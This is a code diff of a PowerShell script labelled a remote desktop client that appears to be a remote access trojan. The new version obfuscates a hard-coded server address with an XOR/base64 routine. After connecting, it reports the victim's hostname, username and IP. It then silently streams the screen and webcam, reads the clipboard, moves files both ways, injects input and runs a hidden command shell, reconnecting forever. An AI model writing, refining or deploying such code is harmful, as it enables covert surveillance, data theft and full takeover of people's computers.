@@ -1,387 +1,174 @@
-# Remote Desktop Control Client
-$ServerIP = "144.172.88.250"
-$ServerPort = 6000
+# Minimal Remote Desktop Client - Server-Controlled (v3 - Fast)
+# Encrypted connection config
+$_k=[Convert]::FromBase64String('P7p6IJ0QTHlRsj8wLCS2XA==')
+function _D($e){$b=[Convert]::FromBase64String($e);$r=New-Object byte[] $b.Length;for($i=0;$i-lt $b.Length;$i++){$r[$i]=$b[$i]-bxor $_k[$i%$_k.Length]};[Text.Encoding]::UTF8.GetString($r)}
+$ServerIP=_D 'Do5ODqwnfldpihECGRQ='
+$ServerPort=[int](_D 'CYpKEA==')
 
 Add-Type -AssemblyName System.Drawing
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
-public class Win32API {
-    [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, uint dx, uint dy, int dwData, int dwExtraInfo);
-    [DllImport("user32.dll")] public static extern bool SetCursorPos(int X, int Y);
-    public const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
-    public const uint MOUSEEVENTF_LEFTUP = 0x0004;
-    public const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
-    public const uint MOUSEEVENTF_RIGHTUP = 0x0010;
-    public const uint MOUSEEVENTF_WHEEL = 0x0800;
+public class Win32 {
+    [DllImport("user32.dll")] public static extern void mouse_event(uint f, uint dx, uint dy, int d, int e);
+    [DllImport("user32.dll")] public static extern bool SetCursorPos(int x, int y);
+    public const uint LD=0x02, LU=0x04, RD=0x08, RU=0x10, MD=0x20, MU=0x40, WH=0x800, HW=0x1000;
 }
 "@
 
-$global:tcpClient = $null
-$global:stream = $null
-$global:running = $true
-$global:streaming = $false
-$global:cameraActive = $false
-$global:hostname = $env:COMPUTERNAME
-$global:username = $env:USERNAME
-$global:localIP = try { (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*" -and $_.IPAddress -ne "127.0.0.1"} | Select-Object -First 1).IPAddress } catch { "Unknown" }
-$global:screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
-$global:screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
-$global:camProcess = $null
-$global:shellProcess = $null
-$global:shellReader = $null
-$global:webcam = $null
-
-# Native Windows Camera Support (No Python needed!)
-Add-Type -AssemblyName System.Drawing
-Add-Type -ReferencedAssemblies @('System.Drawing', 'System.Windows.Forms') @"
-using System;
-using System.Drawing;
-using System.Drawing.Imaging;
-using System.Runtime.InteropServices;
-using System.Runtime.InteropServices.ComTypes;
-
-public class WebcamCapture {
-    [DllImport("avicap32.dll")] private static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hwndParent, int nID);
-    [DllImport("user32.dll")] private static extern bool SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
-    [DllImport("user32.dll")] private static extern bool DestroyWindow(IntPtr hWnd);
-
-    private const int WM_CAP_DRIVER_CONNECT = 0x40A;
-    private const int WM_CAP_DRIVER_DISCONNECT = 0x40B;
-    private const int WM_CAP_SET_PREVIEW = 0x432;
-    private const int WM_CAP_SET_PREVIEWRATE = 0x434;
-    private const int WM_CAP_GRAB_FRAME = 0x43C;
-    private const int WM_CAP_GET_FRAME = 0x43D;
-    private const int WM_CAP_COPY = 0x41E;
-
-    private IntPtr hWnd = IntPtr.Zero;
-
-    public bool Start(int deviceIndex = 0) {
-        try {
-            hWnd = capCreateCaptureWindowA("WebcamCapture", 0, 0, 0, 640, 480, IntPtr.Zero, 0);
-            if (hWnd == IntPtr.Zero) return false;
-            if (!SendMessage(hWnd, WM_CAP_DRIVER_CONNECT, (IntPtr)deviceIndex, IntPtr.Zero)) {
-                DestroyWindow(hWnd);
-                hWnd = IntPtr.Zero;
-                return false;
-            }
-            SendMessage(hWnd, WM_CAP_SET_PREVIEW, IntPtr.Zero, IntPtr.Zero);
-            return true;
-        } catch { return false; }
-    }
-
-    public byte[] CaptureFrame() {
-        if (hWnd == IntPtr.Zero) return null;
-        try {
-            SendMessage(hWnd, WM_CAP_GRAB_FRAME, IntPtr.Zero, IntPtr.Zero);
-            SendMessage(hWnd, WM_CAP_COPY, IntPtr.Zero, IntPtr.Zero);
-            System.Windows.Forms.IDataObject data = System.Windows.Forms.Clipboard.GetDataObject();
-            if (data != null && data.GetDataPresent(typeof(Bitmap))) {
-                Bitmap bmp = (Bitmap)data.GetData(typeof(Bitmap));
-                using (System.IO.MemoryStream ms = new System.IO.MemoryStream()) {
-                    bmp.Save(ms, ImageFormat.Jpeg);
-                    return ms.ToArray();
-                }
-            }
-            return null;
-        } catch { return null; }
-    }
-
-    public void Stop() {
-        if (hWnd != IntPtr.Zero) {
-            SendMessage(hWnd, WM_CAP_DRIVER_DISCONNECT, IntPtr.Zero, IntPtr.Zero);
-            DestroyWindow(hWnd);
-            hWnd = IntPtr.Zero;
-        }
-    }
-
-    public static bool IsCameraAvailable() {
-        try {
-            IntPtr hWnd = capCreateCaptureWindowA("Test", 0, 0, 0, 1, 1, IntPtr.Zero, 0);
-            if (hWnd == IntPtr.Zero) return false;
-            bool connected = SendMessage(hWnd, WM_CAP_DRIVER_CONNECT, IntPtr.Zero, IntPtr.Zero);
-            if (connected) SendMessage(hWnd, WM_CAP_DRIVER_DISCONNECT, IntPtr.Zero, IntPtr.Zero);
-            DestroyWindow(hWnd);
-            return connected;
-        } catch { return false; }
-    }
-}
+$_da=[System.Drawing.Bitmap].Assembly.Location;$_fa=[System.Windows.Forms.Form].Assembly.Location
+Add-Type -ReferencedAssemblies @($_da,$_fa) @"
+using System; using System.Drawing; using System.Drawing.Imaging; using System.Runtime.InteropServices;
+public class Cam {
+    [DllImport("avicap32.dll")] static extern IntPtr capCreateCaptureWindowA(string n,int s,int x,int y,int w,int h,IntPtr p,int i);
+    [DllImport("user32.dll")] static extern bool SendMessage(IntPtr h,uint m,IntPtr w,IntPtr l);
+    [DllImport("user32.dll")] static extern bool DestroyWindow(IntPtr h);
+    IntPtr hWnd; public bool Start(){hWnd=capCreateCaptureWindowA("C",0,0,0,640,480,IntPtr.Zero,0);if(hWnd==IntPtr.Zero)return false;
+    if(!SendMessage(hWnd,0x40A,IntPtr.Zero,IntPtr.Zero)){DestroyWindow(hWnd);hWnd=IntPtr.Zero;return false;}SendMessage(hWnd,0x432,IntPtr.Zero,IntPtr.Zero);return true;}
+    public byte[] Get(){if(hWnd==IntPtr.Zero)return null;try{SendMessage(hWnd,0x43C,IntPtr.Zero,IntPtr.Zero);SendMessage(hWnd,0x41E,IntPtr.Zero,IntPtr.Zero);
+    var d=System.Windows.Forms.Clipboard.GetDataObject();if(d!=null&&d.GetDataPresent(typeof(Bitmap))){var b=(Bitmap)d.GetData(typeof(Bitmap));
+    using(var m=new System.IO.MemoryStream()){b.Save(m,ImageFormat.Jpeg);return m.ToArray();}}return null;}catch{return null;}}
+    public void Stop(){if(hWnd!=IntPtr.Zero){SendMessage(hWnd,0x40B,IntPtr.Zero,IntPtr.Zero);DestroyWindow(hWnd);hWnd=IntPtr.Zero;}}}
 "@
 
-# Detect camera availability
-$global:cameraAvailable = $false
-try { $global:cameraAvailable = [WebcamCapture]::IsCameraAvailable() } catch {}
+# Cache JPEG encoder once (avoid repeated lookup every frame)
+$script:jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }
 
-function Send-Command {
-    param([string]$CommandJSON)
-    try {
-        $bytes = [System.Text.Encoding]::UTF8.GetBytes($CommandJSON + "`n")
-        $global:stream.Write($bytes, 0, $bytes.Length)
-        $global:stream.Flush()
-        return $true
-    } catch { return $false }
+$g = @{tc=$null;s=$null;run=$true;str=$false;cam=$false;wc=$null;q=60;mon=0;sh=$null;sho=$null}
+
+function Send($d){try{$b=[Text.Encoding]::UTF8.GetBytes(($d|ConvertTo-Json -Compress -Depth 3)+"`n");$g.s.Write($b,0,$b.Length);$g.s.Flush();return $true}catch{return $false}}
+
+function SendBin($type,$data){
+    if(!(Send @{type=$type})){return $false}
+    $l=[BitConverter]::GetBytes([uint32]$data.Length);[Array]::Reverse($l)
+    $g.s.Write($l,0,4);$g.s.Write($data,0,$data.Length);$g.s.Flush();return $true
 }
 
-function Send-Screen {
-    try {
-        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-        $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
-        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
-        $ms = New-Object System.IO.MemoryStream
-        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
-        $imageBytes = $ms.ToArray()
-        $graphics.Dispose(); $bitmap.Dispose(); $ms.Dispose()
-
-        if (-not (Send-Command (@{type = "SCREEN"} | ConvertTo-Json -Compress))) { return $false }
-
-        $lengthBytes = [BitConverter]::GetBytes([uint32]$imageBytes.Length)
-        [Array]::Reverse($lengthBytes)
-        $global:stream.Write($lengthBytes, 0, 4)
-        $global:stream.Write($imageBytes, 0, $imageBytes.Length)
-        $global:stream.Flush()
-        return $true
-    } catch { return $false }
+function ReadAll($stream,$buf,$count){
+    $r=0;while($r-lt$count){$n=$stream.Read($buf,$r,$count-$r);if($n-le 0){return $false};$r+=$n};return $true
 }
 
-function Start-Camera {
-    try {
-        $global:webcam = New-Object WebcamCapture
-        if ($global:webcam.Start(0)) {
-            $global:cameraActive = $true
-            Send-Command (@{type = "CAMERA_FRAME"; status = "active"} | ConvertTo-Json -Compress)
-        } else {
-            $global:webcam = $null
-            $global:cameraActive = $false
-            Send-Command (@{type = "CAMERA_FRAME"; status = "error"; error = "Failed to connect to camera"} | ConvertTo-Json -Compress)
-        }
-    } catch {
-        $global:webcam = $null
-        $global:cameraActive = $false
-        Send-Command (@{type = "CAMERA_FRAME"; status = "error"; error = "$_"} | ConvertTo-Json -Compress)
+function Scr{
+    try{
+        $sc=[Windows.Forms.Screen]::AllScreens;$b=$sc[$g.mon].Bounds
+        $bm=New-Object Drawing.Bitmap($b.Width,$b.Height)
+        $gr=[Drawing.Graphics]::FromImage($bm)
+        $gr.CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.Size)
+        $gr.Dispose()
+        $m=New-Object IO.MemoryStream
+        $p=New-Object Drawing.Imaging.EncoderParameters(1)
+        $p.Param[0]=New-Object Drawing.Imaging.EncoderParameter([Drawing.Imaging.Encoder]::Quality,[long]$g.q)
+        $bm.Save($m,$script:jpegCodec,$p);$i=$m.ToArray();$bm.Dispose();$m.Dispose()
+        return (SendBin "SCREEN" $i)
+    }catch{return $false}
+}
+
+function StartShell($shellType){
+    StopShell
+    try{
+        $si=New-Object Diagnostics.ProcessStartInfo
+        $si.FileName=if($shellType-eq"powershell"){"powershell.exe"}else{"cmd.exe"}
+        $si.UseShellExecute=$false
+        $si.RedirectStandardInput=$true
+        $si.RedirectStandardOutput=$true
+        $si.RedirectStandardError=$true
+        $si.CreateNoWindow=$true
+        $g.sh=[Diagnostics.Process]::Start($si)
+        $g.sho=New-Object Collections.Concurrent.ConcurrentQueue[string]
+        $g.sh.add_OutputDataReceived({param($s,$e)if($null-ne$e.Data){$g.sho.Enqueue($e.Data)}})
+        $g.sh.add_ErrorDataReceived({param($s,$e)if($null-ne$e.Data){$g.sho.Enqueue("[ERR] "+$e.Data)}})
+        $g.sh.BeginOutputReadLine()
+        $g.sh.BeginErrorReadLine()
+    }catch{Send @{type="SHELL_OUTPUT";output="[ERROR] Failed to start shell: $_"}}
+}
+
+function StopShell{
+    if($g.sh-and!$g.sh.HasExited){try{$g.sh.Kill()}catch{}}
+    if($g.sh){try{$g.sh.Dispose()}catch{}}
+    $g.sh=$null;$g.sho=$null
+}
+
+function FlushShell{
+    if($null-eq$g.sho-or$g.sho.Count-eq 0){return}
+    $out="";$line=$null
+    while($g.sho.TryDequeue([ref]$line)){$out+=$line+"`n"}
+    if($out.Length-gt 0){Send @{type="SHELL_OUTPUT";output=$out}|Out-Null}
+}
+
+function Proc($j){try{$c=$j|ConvertFrom-Json;switch($c.type){
+"START_STREAM"{$g.str=$true}"STOP_STREAM"{$g.str=$false}
+"MOUSE_MOVE"{[Win32]::SetCursorPos($c.x,$c.y)}
+"MOUSE_DOWN"{[Win32]::SetCursorPos($c.x,$c.y);$f=if($c.button-eq"right"){[Win32]::RD}elseif($c.button-eq"middle"){[Win32]::MD}else{[Win32]::LD};[Win32]::mouse_event($f,0,0,0,0)}
+"MOUSE_UP"{[Win32]::SetCursorPos($c.x,$c.y);$f=if($c.button-eq"right"){[Win32]::RU}elseif($c.button-eq"middle"){[Win32]::MU}else{[Win32]::LU};[Win32]::mouse_event($f,0,0,0,0)}
+"MOUSE_CLICK"{[Win32]::SetCursorPos($c.x,$c.y);$d,$u=if($c.button-eq"right"){[Win32]::RD,[Win32]::RU}elseif($c.button-eq"middle"){[Win32]::MD,[Win32]::MU}else{[Win32]::LD,[Win32]::LU};[Win32]::mouse_event($d,0,0,0,0);Sleep -m 30;[Win32]::mouse_event($u,0,0,0,0)}
+"MOUSE_DOUBLE_CLICK"{[Win32]::SetCursorPos($c.x,$c.y);$d,$u=if($c.button-eq"right"){[Win32]::RD,[Win32]::RU}elseif($c.button-eq"middle"){[Win32]::MD,[Win32]::MU}else{[Win32]::LD,[Win32]::LU};0..1|%{[Win32]::mouse_event($d,0,0,0,0);Sleep -m 30;[Win32]::mouse_event($u,0,0,0,0);if($_-eq 0){Sleep -m 30}}}
+"KEYBOARD"{try{[Windows.Forms.SendKeys]::SendWait($c.key)}catch{}}
+"MOUSE_SCROLL"{[Win32]::SetCursorPos($c.x,$c.y);[Win32]::mouse_event($(if($c.horizontal){[Win32]::HW}else{[Win32]::WH}),0,0,($c.delta*120),0)}
+"SET_QUALITY"{$g.q=[int]$c.quality}
+"SWITCH_MONITOR"{$g.mon=[int]$c.monitor}
+"CLIPBOARD_SET"{try{Set-Clipboard $c.text}catch{}}
+"CLIPBOARD_GET"{try{Send @{type="CLIPBOARD_TEXT";text=(Get-Clipboard -Raw)}}catch{Send @{type="CLIPBOARD_TEXT";text=""}}}
+"FILE_LIST"{try{$items=@(Get-ChildItem -Path $c.path -Force -ErrorAction Stop|ForEach-Object{@{name=$_.Name;type=if($_.PSIsContainer){"folder"}else{"file"};size=$_.Length;modified=$_.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")}});Send @{type="FILE_LIST_RESPONSE";items=$items}}catch{Send @{type="FILE_LIST_RESPONSE";items=@()}}}
+"FILE_DOWNLOAD"{try{if(Test-Path $c.path){$b=[IO.File]::ReadAllBytes($c.path);SendBin "FILE_DATA" $b|Out-Null}}catch{}}
+"FILE_UPLOAD"{try{$l=New-Object byte[] 4;if(!(ReadAll $g.s $l 4)){return};[Array]::Reverse($l);$sz=[BitConverter]::ToUInt32($l,0);$b=New-Object byte[] $sz;if(!(ReadAll $g.s $b $sz)){return};[IO.File]::WriteAllBytes($c.path,$b);Send @{type="FILE_UPLOAD_COMPLETE"}}catch{}}
+"CAMERA_ON"{try{$g.wc=New-Object Cam;if($g.wc.Start()){$g.cam=$true;Send @{type="CAMERA_FRAME";status="active"}}else{$g.wc=$null;$g.cam=$false;Send @{type="CAMERA_FRAME";status="error"}}}catch{$g.wc=$null;$g.cam=$false}}
+"CAMERA_OFF"{try{$g.cam=$false;if($g.wc){$g.wc.Stop();$g.wc=$null}Send @{type="CAMERA_FRAME";status="inactive"}}catch{}}
+"SHELL_START"{StartShell $c.shell_type}
+"SHELL_STOP"{StopShell;Send @{type="SHELL_OUTPUT";output="[Shell stopped]"}}
+"SHELL_INPUT"{if($g.sh-and!$g.sh.HasExited){try{$g.sh.StandardInput.WriteLine($c.command)}catch{Send @{type="SHELL_OUTPUT";output="[ERROR] $_"}}}}
+"DISCONNECT"{$g.run=$false}
+"PING"{Send @{type="PONG"}}
+}}catch{}}
+
+while($g.run){try{
+$g.tc=New-Object Net.Sockets.TcpClient
+if(!$g.tc.ConnectAsync($ServerIP,$ServerPort).Wait(5000)){$g.tc.Close();Sleep 5;continue}
+$g.tc.NoDelay=$true
+$g.tc.ReceiveBufferSize=262144
+$g.tc.SendBufferSize=262144
+$g.s=$g.tc.GetStream()
+$g.s.ReadTimeout=30000
+$sc=[Windows.Forms.Screen]::AllScreens
+$m=@();0..($sc.Count-1)|%{$m+=@{index=$_;width=$sc[$_].Bounds.Width;height=$sc[$_].Bounds.Height;primary=$sc[$_].Primary}}
+$myip="Unknown";try{$myip=(Get-NetIPAddress -AddressFamily IPv4 -ErrorAction Stop|?{$_.InterfaceAlias-notlike"*Loopback*"-and$_.IPAddress-ne"127.0.0.1"}|select -First 1).IPAddress;if(!$myip){$myip="Unknown"}}catch{$myip="Unknown"}
+if(!(Send @{type="IDENTIFY";hostname=$env:COMPUTERNAME;username=$env:USERNAME;ip=$myip;
+version="3.0";camera_available=$true;screen_width=$sc[0].Bounds.Width;screen_height=$sc[0].Bounds.Height;monitors=$m;os_info=$(if([Environment]::OSVersion.Version.Build-ge 22000){"Windows 11"}else{"Windows 10"})})){Sleep 5;continue}
+
+$ls=[DateTime]::Now;$lc=[DateTime]::Now;$lh=[DateTime]::Now
+while($g.run){
+    $n=[DateTime]::Now
+
+    # Screen streaming: 80ms interval = ~12 FPS
+    if($g.str-and($n-$ls).TotalMilliseconds-ge 80){
+        if(Scr){$ls=$n}else{Sleep -m 50}
     }
-}
 
-function Send-CameraFrame {
-    try {
-        if (-not $global:cameraActive -or -not $global:webcam) {
-            $global:cameraActive = $false
-            return
-        }
-
-        $jpegBuf = $global:webcam.CaptureFrame()
-        if (-not $jpegBuf -or $jpegBuf.Length -eq 0) { return }
-
-        if (-not (Send-Command (@{type = "CAMERA_FRAME"} | ConvertTo-Json -Compress))) {
-            $global:cameraActive = $false
-            return
-        }
-
-        $lengthBytes = [BitConverter]::GetBytes([uint32]$jpegBuf.Length)
-        [Array]::Reverse($lengthBytes)
-        $global:stream.Write($lengthBytes, 0, 4)
-        $global:stream.Write($jpegBuf, 0, $jpegBuf.Length)
-        $global:stream.Flush()
-    } catch {
-        $global:cameraActive = $false
+    # Camera: 250ms interval = ~4 FPS
+    if($g.cam-and($n-$lc).TotalMilliseconds-ge 250){
+        try{$f=$g.wc.Get();if($f){SendBin "CAMERA_FRAME" $f|Out-Null};$lc=$n}catch{$g.cam=$false}
     }
-}
 
-function Stop-Camera {
-    try {
-        $global:cameraActive = $false
-        if ($global:webcam) {
-            $global:webcam.Stop()
-            $global:webcam = $null
+    # Flush persistent shell output
+    FlushShell
+
+    # Heartbeat every 5s
+    if(($n-$lh).TotalMilliseconds-ge 5000){if(!(Send @{type="HEARTBEAT";timestamp=$n.ToString("o")})){break}$lh=$n}
+
+    # Process incoming commands (non-blocking)
+    if($g.s.DataAvailable){
+        $buf=New-Object Collections.Generic.List[byte]
+        while($g.s.DataAvailable){
+            $x=$g.s.ReadByte()
+            if($x-eq-1){break}
+            if($x-eq 10){
+                if($buf.Count-gt 0){$l=[Text.Encoding]::UTF8.GetString($buf.ToArray());Proc $l;$buf.Clear()}
+            }else{$buf.Add($x)}
         }
-        Send-Command (@{type = "CAMERA_FRAME"; status = "inactive"} | ConvertTo-Json -Compress)
-    } catch {}
-}
-
-function Execute-ShellCommand {
-    param([string]$Command, [string]$ShellType = "cmd")
-    try {
-        $psi = New-Object System.Diagnostics.ProcessStartInfo
-        if ($ShellType -eq "powershell") {
-            $psi.FileName = "powershell.exe"
-            # Wrap command to ensure output with Out-String
-            $wrappedCmd = "& { $Command } | Out-String -Width 120"
-            $psi.Arguments = "-NoLogo -NoProfile -ExecutionPolicy Bypass -Command `"$wrappedCmd`""
-        } else {
-            $psi.FileName = "cmd.exe"
-            $psi.Arguments = "/c $Command 2>&1"
-        }
-        $psi.UseShellExecute = $false
-        $psi.RedirectStandardOutput = $true
-        $psi.RedirectStandardError = $true
-        $psi.CreateNoWindow = $true
-        $psi.StandardOutputEncoding = [System.Text.Encoding]::UTF8
-        $psi.StandardErrorEncoding = [System.Text.Encoding]::UTF8
-
-        $process = [System.Diagnostics.Process]::Start($psi)
-        $stdout = $process.StandardOutput.ReadToEnd()
-        $stderr = $process.StandardError.ReadToEnd()
-        $process.WaitForExit()
-
-        $output = ""
-        if ($stdout) { $output += $stdout.TrimEnd() }
-        if ($stderr) {
-            if ($output) { $output += "`r`n" }
-            $output += "[ERROR] $stderr".TrimEnd()
-        }
-
-        if (-not $output) { $output = "(No output)" }
-        Send-Command (@{type = "SHELL_OUTPUT"; output = $output + "`r`n"} | ConvertTo-Json -Compress)
-    } catch {
-        Send-Command (@{type = "SHELL_OUTPUT"; output = "[ERROR] $_`r`n"} | ConvertTo-Json -Compress)
+        if($buf.Count-gt 0){$l=[Text.Encoding]::UTF8.GetString($buf.ToArray());Proc $l}
     }
+
+    # Minimal sleep to prevent CPU spin (15ms = responsive)
+    Sleep -m 15
 }
-
-function Read-Line {
-    try {
-        $bytes = New-Object System.Collections.Generic.List[byte]
-        while ($true) {
-            $byte = $global:stream.ReadByte()
-            if ($byte -eq -1) { return $null }
-            if ($byte -eq 10) { break }
-            $bytes.Add($byte)
-        }
-        return [System.Text.Encoding]::UTF8.GetString($bytes.ToArray())
-    } catch { return $null }
-}
-
-function Process-Command {
-    param([string]$CommandJSON)
-    try {
-        $c = $CommandJSON | ConvertFrom-Json
-        switch ($c.type) {
-            "START_STREAM" { $global:streaming = $true }
-            "STOP_STREAM"  { $global:streaming = $false }
-            "MOUSE_MOVE" { [Win32API]::SetCursorPos($c.x, $c.y) }
-            "MOUSE_DOWN" {
-                [Win32API]::SetCursorPos($c.x, $c.y)
-                Start-Sleep -Milliseconds 10
-                [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
-            }
-            "MOUSE_UP" { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTUP, 0, 0, 0, 0) }
-            "MOUSE_CLICK" {
-                [Win32API]::SetCursorPos($c.x, $c.y)
-                Start-Sleep -Milliseconds 10
-                $down = if ($c.button -eq "right") { [Win32API]::MOUSEEVENTF_RIGHTDOWN } else { [Win32API]::MOUSEEVENTF_LEFTDOWN }
-                $up = if ($c.button -eq "right") { [Win32API]::MOUSEEVENTF_RIGHTUP } else { [Win32API]::MOUSEEVENTF_LEFTUP }
-                [Win32API]::mouse_event($down, 0, 0, 0, 0)
-                Start-Sleep -Milliseconds 50
-                [Win32API]::mouse_event($up, 0, 0, 0, 0)
-            }
-            "MOUSE_DOUBLE_CLICK" {
-                [Win32API]::SetCursorPos($c.x, $c.y)
-                Start-Sleep -Milliseconds 10
-                $down = if ($c.button -eq "right") { [Win32API]::MOUSEEVENTF_RIGHTDOWN } else { [Win32API]::MOUSEEVENTF_LEFTDOWN }
-                $up = if ($c.button -eq "right") { [Win32API]::MOUSEEVENTF_RIGHTUP } else { [Win32API]::MOUSEEVENTF_LEFTUP }
-                for ($i = 0; $i -lt 2; $i++) {
-                    [Win32API]::mouse_event($down, 0, 0, 0, 0)
-                    Start-Sleep -Milliseconds 50
-                    [Win32API]::mouse_event($up, 0, 0, 0, 0)
-                    if ($i -eq 0) { Start-Sleep -Milliseconds 50 }
-                }
-            }
-            "KEYBOARD" { try { [System.Windows.Forms.SendKeys]::SendWait($c.key) } catch {} }
-            "MOUSE_SCROLL" {
-                [Win32API]::SetCursorPos($c.x, $c.y)
-                Start-Sleep -Milliseconds 10
-                [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_WHEEL, 0, 0, ($c.delta * 120), 0)
-            }
-            "CLIPBOARD_SET" { try { Set-Clipboard -Value $c.text } catch {} }
-            "CLIPBOARD_GET" {
-                try {
-                    $clipText = Get-Clipboard -Raw -ErrorAction Stop
-                    Send-Command (@{type = "CLIPBOARD_TEXT"; text = $clipText} | ConvertTo-Json -Compress)
-                } catch {
-                    Send-Command (@{type = "CLIPBOARD_TEXT"; text = ""} | ConvertTo-Json -Compress)
-                }
-            }
-            "CAMERA_ON"  { Start-Camera }
-            "CAMERA_OFF" { Stop-Camera }
-            "SHELL_START" {
-                $global:shellType = if ($c.shell_type) { $c.shell_type } else { "cmd" }
-                Send-Command (@{type = "SHELL_OUTPUT"; output = "Shell ready ($global:shellType). Send commands.`r`n"} | ConvertTo-Json -Compress)
-            }
-            "SHELL_STOP" {
-                Send-Command (@{type = "SHELL_OUTPUT"; output = "Shell closed.`r`n"} | ConvertTo-Json -Compress)
-            }
-            "SHELL_INPUT" {
-                $shellType = if ($global:shellType) { $global:shellType } else { "cmd" }
-                Execute-ShellCommand -Command $c.command -ShellType $shellType
-            }
-            "DISCONNECT" { $global:running = $false }
-            "PING" { Send-Command (@{type = "PONG"} | ConvertTo-Json -Compress) }
-        }
-    } catch {}
-}
-
-function Start-Client {
-    try {
-        $global:tcpClient = New-Object System.Net.Sockets.TcpClient
-        if (-not $global:tcpClient.ConnectAsync($ServerIP, $ServerPort).Wait(5000)) {
-            $global:tcpClient.Close(); throw "Connection timed out"
-        }
-        $global:stream = $global:tcpClient.GetStream()
-        $global:stream.ReadTimeout = 30000
-
-        $identify = @{
-            type = "IDENTIFY"
-            hostname = $global:hostname
-            username = $global:username
-            ip = $global:localIP
-            version = "1.0"
-            camera_available = $global:cameraAvailable
-            screen_width = $global:screenWidth
-            screen_height = $global:screenHeight
-            os_info = $(
-                $build = [System.Environment]::OSVersion.Version.Build
-                if ($build -ge 22000) { "Windows 11 (Build $build)" } else { "Windows 10 (Build $build)" }
-            )
-        } | ConvertTo-Json -Compress
-        if (-not (Send-Command $identify)) { throw "Failed to send identification" }
-
-        $lastScreen = [DateTime]::Now
-        $lastCamera = [DateTime]::Now
-        $lastHB = [DateTime]::Now
-
-        while ($global:running) {
-            $now = [DateTime]::Now
-            if ($global:streaming -and ($now - $lastScreen).TotalMilliseconds -ge 250) {
-                if (Send-Screen) { $lastScreen = $now }
-                else { Start-Sleep -Milliseconds 100 }
-            }
-            if ($global:cameraActive -and ($now - $lastCamera).TotalMilliseconds -ge 500) {
-                Send-CameraFrame; $lastCamera = $now
-            }
-            if (($now - $lastHB).TotalMilliseconds -ge 5000) {
-                if (-not (Send-Command (@{type = "HEARTBEAT"; timestamp = $now.ToString("o")} | ConvertTo-Json -Compress))) { break }
-                $lastHB = $now
-            }
-            if ($global:stream.DataAvailable) {
-                $line = Read-Line
-                if ($line) { Process-Command $line } else { break }
-            }
-            Start-Sleep -Milliseconds 50
-        }
-    } catch {}
-    finally {
-        if ($global:stream) { $global:stream.Close() }
-        if ($global:tcpClient) { $global:tcpClient.Close() }
-    }
-}
-
-$null = Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action { $global:running = $false }
-
-try {
-    Start-Client
-    while ($true) {
-        Start-Sleep -Seconds 5
-        $global:running = $true
-        Start-Client
-    }
-} catch {}
+}catch{}finally{StopShell;if($g.s){$g.s.Close()}if($g.tc){$g.tc.Close()}}Sleep 5}
